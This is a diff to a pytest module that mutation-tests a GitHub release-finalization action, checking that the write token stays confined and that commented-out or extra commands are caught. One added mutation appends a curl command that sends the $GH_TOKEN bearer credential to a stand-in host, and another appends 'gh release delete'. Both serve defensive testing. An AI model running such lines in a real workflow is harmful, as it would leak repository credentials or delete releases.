@@ -177,7 +177,14 @@ EXPECTED_PERMISSIONS = {"contents": "write"}
 
 
 def load_action() -> dict[str, object]:
-    """Read the finalization action as a checked mapping."""
+    """Read the finalization action as a checked mapping.
+
+    Returns
+    -------
+    dict[str, object]
+        The parsed action document, narrowed to a mapping so the contract reads
+        keys rather than the loader's own result type.
+    """
     return require_mapping(
         yaml.safe_load(ACTION_PATH.read_text(encoding="utf-8")),
         "finalize-github-release action",
@@ -185,14 +192,38 @@ def load_action() -> dict[str, object]:
 
 
 def load_action_steps(action: dict[str, object]) -> list[dict[str, object]]:
-    """Return the action's steps with each step narrowed to a mapping."""
+    """Return the action's steps with each step narrowed to a mapping.
+
+    Parameters
+    ----------
+    action
+        The document :func:`load_action` returned.
+
+    Returns
+    -------
+    list[dict[str, object]]
+        One mapping per step, in the order the runner executes them.
+    """
     runs = require_mapping(action.get("runs"), "action runs")
     raw_steps = require_list(runs.get("steps"), "action steps")
     return [require_mapping(step, "action step") for step in raw_steps]
 
 
 def run_tokens(run: str) -> list[str]:
-    """Return shell tokens from the step's first ``uv run`` invocation."""
+    """Return shell tokens from the step's first ``uv run`` invocation.
+
+    Parameters
+    ----------
+    run
+        One step's ``run`` script. The search starts at the first line naming
+        ``uv run``, and a trailing backslash continues the invocation onto the
+        next line.
+
+    Returns
+    -------
+    list[str]
+        The invocation's shell tokens, in the order it passes them.
+    """
     lines = run.splitlines()
     start = next(index for index, line in enumerate(lines) if "uv run " in line)
     command = lines[start].strip()
@@ -200,6 +231,34 @@ def run_tokens(run: str) -> list[str]:
         start += 1
         command = f"{command[:-1]} {lines[start].strip()}"
     return shlex.split(command)
+
+
+def script_lines(run: str) -> list[str]:
+    r"""Return a step's executable shell lines, comments and continuations gone.
+
+    A check that reads the raw ``run`` text is satisfied by a line the shell
+    never executes: prefixing ``rm -f`` with ``#`` leaves the command in the
+    file and out of the script. Bash also deletes every backslash-newline
+    before it parses, so an invocation split across lines is a single command.
+    This returns what bash runs, one entry per command line.
+
+    Parameters
+    ----------
+    run
+        One step's ``run`` script as the action declares it.
+
+    Returns
+    -------
+    list[str]
+        The stripped command lines, in the order the step runs them, with
+        comment lines removed and each continuation joined to its line.
+    """
+    joined = run.replace("\\\n", "")
+    return [
+        line.strip()
+        for line in joined.splitlines()
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
 
 
 #: The mutations that put the credential on a step with no use for it, keyed by
@@ -216,17 +275,28 @@ _COMMAND_MUTATIONS = frozenset({
     "aggregate-bound-exceeded",
     "source-build-allowed",
     "gh-in-run",
+    "extra-command",
 })
 
 
 def mutate_action(action: dict[str, object], mutation: str) -> None:
-    """Change one dimension of an action step's command or environment."""
+    """Change one dimension of an action step's command or environment.
+
+    Parameters
+    ----------
+    action
+        The action document to change in place. The caller deep-copies the
+        checked-in action first, so a mutation never edits the file.
+    mutation
+        The mutation id, which selects exactly one change. An id that no branch
+        handles fails the test rather than passing silently.
+    """
     steps = load_action_steps(action)
     if mutation in _TOKEN_MUTATIONS:
         _mutate_token(steps, mutation)
     elif mutation in _COMMAND_MUTATIONS:
         _mutate_command(steps, mutation)
-    elif mutation in {"stale-plan-kept", "missing-plan-guard"}:
+    elif mutation in {"stale-plan-kept", "missing-plan-guard", "commented-plan-reset"}:
         _mutate_plan_step(steps, mutation)
     elif mutation == "wrong-output":
         _mutate_outputs(action)
@@ -274,6 +344,15 @@ def _mutate_command(steps: list[dict[str, object]], mutation: str) -> None:
         case "gh-in-run":
             finalize = named_step(steps, FINALIZE_STEP)
             finalize["run"] = f'{finalize["run"]}gh release delete "$RELEASE_TAG"\n'
+        case "extra-command":
+            # A command the contract never reviewed, sharing the step that
+            # holds the write token. `FORBIDDEN_IN_RUN` names only `gh`, so
+            # nothing but the executable-line count catches this.
+            finalize = named_step(steps, FINALIZE_STEP)
+            finalize["run"] = (
+                f"{finalize['run']}"
+                'curl -fsS -H "Authorization: Bearer $GH_TOKEN" https://example.test\n'
+            )
         case other:
             pytest.fail(f"unknown command mutation {other!r}")
 
@@ -304,5 +383,9 @@ def _mutate_plan_step(steps: list[dict[str, object]], mutation: str) -> None:
             plan["run"] = str(plan["run"]).replace(
                 PLAN_PRESENCE_GUARD, "if false; then"
             )
+        case "commented-plan-reset":
+            # The reset survives as text and leaves the script, so a stale plan
+            # is back to standing in for this run's answer.
+            plan["run"] = str(plan["run"]).replace(PLAN_RESET, f"# {PLAN_RESET}")
         case other:
             pytest.fail(f"unknown plan-step mutation {other!r}")
